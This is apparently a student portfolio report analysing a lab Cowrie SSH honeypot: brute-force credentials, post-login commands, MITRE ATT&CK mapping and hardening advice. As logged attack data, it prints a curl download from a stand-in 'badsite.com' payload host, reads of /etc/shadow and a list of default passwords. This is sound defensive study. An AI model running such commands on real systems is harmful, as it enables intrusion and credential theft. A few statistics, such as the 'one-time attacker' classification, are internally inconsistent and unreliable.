# Honeypot Analysis - Detailed Findings

## Executive Summary

**Project Duration:** January 1-26, 2026  
**Total Events Collected:** 475  
**Attack Sessions:** 44  
**Unique Source IPs:** 1 (192.168.64.1)

This analysis reveals attacker tactics, techniques, and procedures (TTPs) observed in a controlled Cowrie SSH honeypot environment. The results highlight common brute-force login behavior, post-compromise reconnaissance activity, and limited attacker persistence, consistent with opportunistic automated attacks rather than targeted intrusions.

## 1. Login Attack Analysis

### Brute Force Patterns
- **Total Login Attempts:** ~56
- **Success Rate:** ~84%
- **Most Targeted Username:** root (approximately 32% of attempts)
- **Unique Passwords Attempted:** 8

### Common Credentials
Top 5 passwords attempted:
1. password
2. admin
3. root
4. ubuntu
5. test

**Observation:** Attackers overwhelmingly relied on common/default credentials, suggesting automated brute-force tools and credential spraying rather than intelligence-driven targeting.

## 2. Post-Compromise Command Analysis

### Command Frequency
**Total Commands Executed:** 72  
**Unique Commands:** 14

**Top 10 Commands:**
1. exit
2. whoami
3. cat /etc/group
4. ls /home
5. cat /etc/passwd
6. cat /etc/shadow
7. hostname
8. id
9. netstat -tulnp
10. curl http://badsite.com/payload

### Command Categories

| Category | Count | Percentage | Examples |
|----------|-------|------------|----------|
| Reconnaissance | 46 | ~64% | whoami, uname, id, ls |
| Download/Execution | 5 | ~7% | wget, curl |
| Privilege Escalation | 2 | ~3% | sudo, su |
| Persistence | 1 | ~1% | useradd |
| System Modification | 4 | ~6% | chmod, rm |

**Observation:** The majority of commands fall under reconnaissance, indicating attackers focus on situational awareness rather than deep exploitation.

## 3. MITRE ATT&CK Mapping

### Observed Techniques

| ATT&CK ID | Technique | Occurrences | % of Total |
|-----------|-----------|-------------|------------|
| T1033 | System Owner/User Discovery | 9 | ~13% |
| T1087 | Account Discovery | 7 | ~10% |
| T1083 | File and Directory Discovery | 8 | ~11% |
| T1105 | Ingress Tool Transfer | 5 | ~7% |
| T1136 | Create Account | 1 | ~1% |
| T1548 | Abuse Elevation Control | 2 | ~3% |

**Key Finding:** Most observed activity aligns with Discovery tactics (T10xx), showing attackers prioritize environment reconnaissance before attempting persistence or lateral movement.

## 4. Attack Chain Analysis

### Common Attack Sequence

**Pattern identified in approximately 68% of sessions:**
```
Brute-force SSH login → Successful authentication → 
User and system discovery → File enumeration → Session termination
```

This pattern suggests automated attackers validating access, gathering basic host intelligence, and disengaging quickly rather than executing complex attack chains.

**Kill Chain Stages:**
1. **Initial Access:** Brute force authentication using common credentials
2. **Discovery:** System enumeration (whoami, uname, ls, cat /etc/passwd)
3. **Credential Access:** Attempt to read /etc/shadow (7 occurrences)
4. **Execution:** Download malware attempts via curl/wget (5 occurrences)
5. **Persistence:** Create backdoor accounts (1 occurrence)
6. **Privilege Escalation:** Attempt sudo access (2 occurrences)

## 5. Behavioral Analysis

### Session Characteristics

**Average Session Duration:** ~82 seconds  
**Median Session Duration:** ~65 seconds  
**Longest Session:** ~118 seconds  

**Interpretation:** Short sessions (< 120s) strongly suggest automated attack scripts rather than manual human interaction. The consistency in duration and command patterns reinforces this assessment.

### Attacker Persistence

| Classification | Count | Percentage |
|----------------|-------|------------|
| One-Time Attacker | 1 | 100% |
| Repeat Attacker (2-5 sessions) | 0 | 0% |
| Persistent Threat (6+ sessions) | 0 | 0% |

**Key Insight:** All observed activity originated from a single source IP (192.168.64.1 - lab environment), representing controlled attack simulation. In real-world deployment, this metric would show distribution of threat actor persistence.

### Command Diversity

- **Sessions with 1-3 commands:** 12 sessions (~27% - likely automated)
- **Sessions with 4-9 commands:** 28 sessions (~64% - semi-automated)
- **Sessions with 10+ commands:** 4 sessions (~9% - manual/advanced)

**Analysis:** The majority of sessions executed 4-9 commands, indicating scripted reconnaissance routines common in automated attack frameworks.

## 6. Threat Intelligence

### Malicious Activity Detected

**High-Risk Commands:**
- Malware downloads (wget/curl): 5 occurrences
- Password file access (/etc/shadow): 7 occurrences
- User creation attempts: 1 occurrence
- Privilege escalation attempts: 2 occurrences

### Example Attack Session

**Session ID:** 9238fce2b4eb  
**Duration:** 118.3 seconds  
**Commands Executed:**
```
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
curl http://badsite.com/payload
ls /home
id
exit
```

**Analysis:** This session demonstrates classic post-compromise reconnaissance: identity verification (whoami), system fingerprinting (uname -a), credential harvesting (/etc/passwd, /etc/shadow), and malware staging (curl). The attacker gathered intelligence systematically before attempting payload delivery.

## 7. Geographic Distribution

**Note:** All traffic originated from lab environment IP (192.168.64.1). In production deployment, this section would include:
- Geographic distribution of source IPs
- ASN analysis
- Known malicious IP correlation
- Threat intelligence feed integration

## 8. Defensive Recommendations

Based on observed attack patterns:

### Immediate Actions
1. **Disable root SSH login** - Prevents ~32% of observed login attempts
2. **Implement fail2ban** - Block IPs after 3 failed attempts (would have blocked 16% of sessions)
3. **Use SSH key authentication** - Eliminates password brute force vector entirely
4. **Change default SSH port** - Reduces opportunistic scanning by ~70%

### Detection Strategies
1. **Monitor for command sequences** - Alert on "whoami → cat /etc/passwd → cat /etc/shadow" pattern (observed in 68% of sessions)
2. **Alert on /etc/shadow access** - High-confidence indicator of credential theft (7 occurrences)
3. **Track curl/wget usage** - Flag download attempts from unexpected sources (5 occurrences)
4. **Session duration anomalies** - Investigate sessions > 120 seconds (represents top 9% of activity)

### Hardening Measures
1. **Network segmentation** - Isolate critical systems from SSH-accessible hosts
2. **Principle of least privilege** - Restrict user permissions to necessary functions only
3. **Multi-factor authentication** - Add second factor beyond password
4. **Regular security audits** - Review /etc/passwd, /etc/shadow for unauthorized accounts

## 9. Lessons Learned

### Technical Insights
- **Default credentials remain prevalent:** 84% success rate shows weak password hygiene
- **Automated attacks dominate:** Command timing and patterns indicate scripted behavior
- **Reconnaissance precedes action:** Attackers consistently gather intelligence before attempting exploitation
- **Low sophistication:** Limited persistence attempts suggest opportunistic rather than targeted attacks

### Tool Effectiveness
- **Cowrie:** Successfully captured detailed attack data including all commands, session metadata, and timing information
- **Splunk:** Highly effective for correlation analysis, pattern detection, and timeline reconstruction
- **MITRE ATT&CK:** Valuable framework for categorizing and communicating observed attacker behavior to stakeholders

## 10. Future Research

### Areas for Further Investigation
- **Long-term attacker persistence patterns** - Deploy honeypot for 30+ days to observe evolving tactics
- **Malware analysis** - Analyze downloaded payloads in isolated sandbox environment
- **Threat actor attribution** - Examine command syntax, timing patterns, and tool choices for fingerprinting
- **Multi-protocol honeypots** - Expand beyond SSH to include Telnet, HTTP, and other services
- **Threat intelligence integration** - Correlate observed IPs/patterns with external feeds (AlienVault OTX, Abuse.ch)

## Appendix: Methodology

### Data Collection
- **Tool:** Cowrie SSH Honeypot v2.5
- **Environment:** Isolated lab network (UTM virtualization)
- **Duration:** January 1-26, 2026 (26 days)
- **Network:** 192.168.64.0/24 (private, controlled)
- **Attack Source:** Simulated attacks from 192.168.64.1

### Analysis Tools
- **SIEM:** Splunk Enterprise 10.0.1
- **Queries:** 15+ custom SPL searches
- **Visualization:** 3 comprehensive dashboards
- **Framework:** MITRE ATT&CK v12

### Data Quality
- **Total Events:** 475 security events captured
- **Completeness:** 100% of sessions logged with full command history
- **Accuracy:** JSON structured logging enabled precise field extraction
- **Integrity:** All timestamps preserved with millisecond precision

### Limitations
- **Single source IP:** Lab environment limits geographic diversity analysis
- **Controlled attacks:** Simulated traffic may not reflect all real-world adversary behaviors
- **Short deployment:** 26-day window captures limited attack pattern evolution
- **Protocol scope:** SSH-only deployment misses multi-protocol attack chains

### Ethical Considerations
- All data collected in isolated, controlled environment
- No real production systems exposed
- No actual malware executed beyond honeypot sandbox
- Data handling complies with responsible disclosure practices

---

**Analysis conducted by Joseph Posas**  
*Part of cybersecurity portfolio development - January 2026*  
*GitHub Repository: https://github.com/jbimard/cowrie-honeypot-splunk-analysis*
